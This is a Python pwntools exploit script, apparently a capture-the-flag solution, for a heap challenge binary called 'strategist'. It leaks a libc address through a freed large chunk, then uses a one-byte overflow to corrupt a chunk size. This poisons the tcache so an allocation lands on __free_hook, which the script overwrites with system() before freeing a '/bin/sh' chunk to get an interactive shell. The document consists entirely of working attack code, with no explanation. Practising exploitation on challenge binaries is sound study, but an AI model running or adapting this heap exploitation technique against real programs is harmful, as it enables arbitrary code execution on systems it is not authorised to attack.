#!/usr/bin/env python3

from pwn import *
import warnings

warnings.filterwarnings('ignore')

context.arch = 'amd64'

fname = './strategist'
if args.GDB:
    io = gdb.debug(fname, '''
    b show_plan
    c
''')
else:
    io = process(fname)
libc = io.libc

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rl = lambda: io.recvline()


def create(size, data):
   sla('> ', '1') 
   sla('> ', str(size))
   sa('> ', data)
   
def show(idx):
    sla('> ', '2')
    sla('> ', str(idx))
    ru('AAAAAAAA')
    arena_addr = u64(rl().strip().ljust(8, b'\x00'))
    print(f'arena address: {arena_addr:#x}')
    return arena_addr - 0x3ebca0  # get from debug

def edit(idx, data):
    sla('> ', '3')
    sla('> ', str(idx))
    sa('> ', data)
    
def delete(idx):
    sla('> ', '4')
    sla('> ', str(idx))

    
# leak libc address
# size must > 0x408, which is max tcache size
create(0x420, 'beef')
create(0x100, 'cafe')
delete(0)
delete(1)
create(0x420, 'AAAAAAAA')

libc.address = show(0)
print(f'libc address: {libc.address:#x}')
delete(0)

# overwrite next pointer of tcache
create(0x18, 'a'*0x18)
create(0x18, 'b'*0x18)
create(0x18, 'c'*0x18)
edit(0,b'a'*0x18 + p8(0x41))
delete(1)
delete(2)
create(0x30, b'a'*0x20 + p64(libc.sym.__free_hook))
create(0x18, b'/bin/sh\x00')
create(0x18, p64(libc.sym.system))
delete(2)

pause(1)
io.interactive()
